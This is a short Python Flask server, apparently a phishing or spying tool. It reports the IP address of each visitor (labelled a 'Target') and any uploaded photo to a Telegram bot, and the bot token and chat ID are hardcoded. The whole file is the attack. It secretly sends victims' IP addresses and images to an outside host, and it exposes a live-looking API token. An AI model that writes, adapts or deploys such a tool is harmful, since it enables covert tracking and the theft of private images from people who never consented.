from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__)

# --- Tomar Details ---
BOT_TOKEN = "7864389146:AAHgYI8Oqj7T_3SND1mE-0M8G9w_vI6I9u4"
CHAT_ID = "6348126868"

@app.route('/')
def index():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": CHAT_ID, "text": f"🚨 Target Clicks!\nIP: {user_ip}"})
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' in request.files:
        file = request.files['photo']
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                      data={"chat_id": CHAT_ID}, files={"photo": file})
    return jsonify({"status": "ok"})
